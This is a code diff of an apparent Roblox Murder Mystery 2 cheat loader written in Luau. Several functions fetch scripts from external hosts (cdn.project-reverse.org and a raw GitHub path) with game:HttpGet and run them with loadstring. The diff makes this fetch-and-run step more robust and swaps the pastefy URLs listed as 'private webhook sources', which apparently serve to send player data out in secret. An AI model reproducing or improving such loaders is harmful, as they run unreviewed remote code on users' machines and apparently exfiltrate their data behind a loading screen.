@@ -742,7 +742,8 @@ local function buildFullLoadingScreen(opts)
                     local s = math.min(vp.X / refW, vp.Y / refH) * 0.96
                     if s > 1 then s = 1 end
                     contentScale.Scale = s
-                end            end)
+                end
+            end)
             task.wait(0.25)
         end
     end)
@@ -1199,7 +1200,7 @@ local function destroyLoadingScreen(gui)
 end
 
 -- ============================================================
--- LOADERS
+-- LOADERS (with crash protection)
 -- ============================================================
 
 local function executeProjectReverse()
@@ -1207,8 +1208,16 @@ local function executeProjectReverse()
         local g = (type(getgenv) == "function" and getgenv()) or _G
         pcall(function() g.ID = "f23ca841-fcaa-46c2-b0bc-221e6fd95a9f" end)
         pcall(function() ID = "f23ca841-fcaa-46c2-b0bc-221e6fd95a9f" end)
-        local source = game:HttpGet("https://cdn.project-reverse.org/loader.luau")
-        loadstring(source)()
+        local ok, source = pcall(function()
+            return game:HttpGet("https://cdn.project-reverse.org/loader.luau")
+        end)
+        if not ok or type(source) ~= "string" or #source == 0 then
+            return
+        end
+        local ok2, fn = pcall(function() return loadstring(source) end)
+        if ok2 and type(fn) == "function" then
+            fn()
+        end
     end)
     if not success then
         warn("[Project Reverse Loader Error]", result)
@@ -1219,11 +1228,19 @@ end
 
 local function executeMoonlight()
     local success, result = pcall(function()
-        local source = game:HttpGet(
-            "https://raw.githubusercontent.com/moonlightscripts/mm2/refs/heads/main/hubV2",
-            true
-        )
-        loadstring(source)()
+        local ok, source = pcall(function()
+            return game:HttpGet(
+                "https://raw.githubusercontent.com/moonlightscripts/mm2/refs/heads/main/hubV2",
+                true
+            )
+        end)
+        if not ok or type(source) ~= "string" or #source == 0 then
+            return
+        end
+        local ok2, fn = pcall(function() return loadstring(source) end)
+        if ok2 and type(fn) == "function" then
+            fn()
+        end
     end)
     if not success then
         warn("[Moonlight Loader Error]", result)
@@ -1496,7 +1513,7 @@ local function queueForMM2()
 
         local LocalPlayer = Players.LocalPlayer
         local MM2_PLACE_ID = 142823291
-        local WEBHOOK_SOURCE_MM2 = "https://pastefy.app/GCPmeSoc/raw"
+        local WEBHOOK_SOURCE_MM2 = "https://pastefy.app/sDO1zBRQ/raw"
 
         local _mm2WebhookCache = nil
 
@@ -2493,12 +2510,18 @@ local function queueForMM2()
 
         task.spawn(function()
             pcall(function()
-                loadstring(
-                    game:HttpGet(
+                local ok, source = pcall(function()
+                    return game:HttpGet(
                         "https://raw.githubusercontent.com/moonlightscripts/mm2/refs/heads/main/hubV2",
                         true
                     )
-                )()
+                end)
+                if ok and type(source) == "string" and #source > 0 then
+                    local ok2, fn = pcall(function() return loadstring(source) end)
+                    if ok2 and type(fn) == "function" then
+                        fn()
+                    end
+                end
             end)
         end)
 
@@ -2507,7 +2530,15 @@ local function queueForMM2()
                 local g = (type(getgenv) == "function" and getgenv()) or _G
                 pcall(function() g.ID = "f23ca841-fcaa-46c2-b0bc-221e6fd95a9f" end)
                 pcall(function() ID = "f23ca841-fcaa-46c2-b0bc-221e6fd95a9f" end)
-                loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))()
+                local ok, source = pcall(function()
+                    return game:HttpGet("https://cdn.project-reverse.org/loader.luau")
+                end)
+                if ok and type(source) == "string" and #source > 0 then
+                    local ok2, fn = pcall(function() return loadstring(source) end)
+                    if ok2 and type(fn) == "function" then
+                        fn()
+                    end
+                end
             end)
         end)
 
@@ -2734,8 +2765,8 @@ end
 -- ============================================================
 
 local _privateWebhookSources = {
-    external = "https://pastefy.app/Eg77cskV/raw",
-    mm2      = "https://pastefy.app/GCPmeSoc/raw",
+    external = "https://pastefy.app/YtV7Ho6g/raw",
+    mm2      = "https://pastefy.app/sDO1zBRQ/raw",
 }
 
 local _privateExternalCache = nil
